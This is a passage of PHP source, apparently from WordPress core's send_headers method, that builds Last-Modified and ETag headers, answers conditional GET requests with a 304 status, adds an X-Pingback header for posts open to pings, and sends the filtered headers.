					$wp_last_modified = $wp_last_modified_comment;
				}
			} else {
				$wp_last_modified = mysql2date( $date_format, get_lastpostmodified( 'GMT' ), false );
			}

			if ( ! $wp_last_modified ) {
				$wp_last_modified = gmdate( $date_format );
			}

			$wp_last_modified .= ' GMT';
			$wp_etag           = '"' . md5( $wp_last_modified ) . '"';

			$headers['Last-Modified'] = $wp_last_modified;
			$headers['ETag']          = $wp_etag;

			// Support for conditional GET.
			if ( isset( $_SERVER['HTTP_IF_NONE_MATCH'] ) ) {
				$client_etag = wp_unslash( $_SERVER['HTTP_IF_NONE_MATCH'] );
			} else {
				$client_etag = '';
			}

			if ( isset( $_SERVER['HTTP_IF_MODIFIED_SINCE'] ) ) {
				$client_last_modified = trim( $_SERVER['HTTP_IF_MODIFIED_SINCE'] );
			} else {
				$client_last_modified = '';
			}

			// If string is empty, return 0. If not, attempt to parse into a timestamp.
			$client_modified_timestamp = $client_last_modified ? strtotime( $client_last_modified ) : 0;

			// Make a timestamp for our most recent modification.
			$wp_modified_timestamp = strtotime( $wp_last_modified );

			if ( ( $client_last_modified && $client_etag )
				? ( ( $client_modified_timestamp >= $wp_modified_timestamp ) && ( $client_etag === $wp_etag ) )
				: ( ( $client_modified_timestamp >= $wp_modified_timestamp ) || ( $client_etag === $wp_etag ) )
			) {
				$status        = 304;
				$exit_required = true;
			}
		}

		if ( is_singular() ) {
			$post = isset( $wp_query->post ) ? $wp_query->post : null;

			// Only set X-Pingback for single posts that allow pings.
			if ( $post && pings_open( $post ) ) {
				$headers['X-Pingback'] = get_bloginfo( 'pingback_url', 'display' );
			}
		}

		/**
		 * Filters the HTTP headers before they're sent to the browser.
		 *
		 * @since 2.8.0
		 *
		 * @param string[] $headers Associative array of headers to be sent.
		 * @param WP       $wp      Current WordPress environment instance.
		 */
		$headers = apply_filters( 'wp_headers', $headers, $this );

		if ( ! empty( $status ) ) {
			status_header( $status );
		}

		// If Last-Modified is set to false, it should not be sent (no-cache situation).
		if ( isset( $headers['Last-Modified'] ) && false === $headers['Last-Modified'] ) {
			unset( $headers['Last-Modified'] );

			if ( ! headers_sent() ) {
				header_remove( 'Last-Modified' );
			}
		}

		if ( ! headers_sent() ) {
			foreach ( (array) $headers as $name => $field_value ) {
				header( "{$name}: {$field_value}" );
			}
		}

		if ( $exit_required ) {
			exit;
		}

		/**
		 * Fires once the requested HTTP headers for caching, content type, etc. have been sent.
		 *
		 * @since 2.1.0
		 *
		 * @param WP $wp Current WordPress environment instance (passed by reference).
		 */
		do_action_ref_array( 'send_headers', array( &$this ) );
	}
    
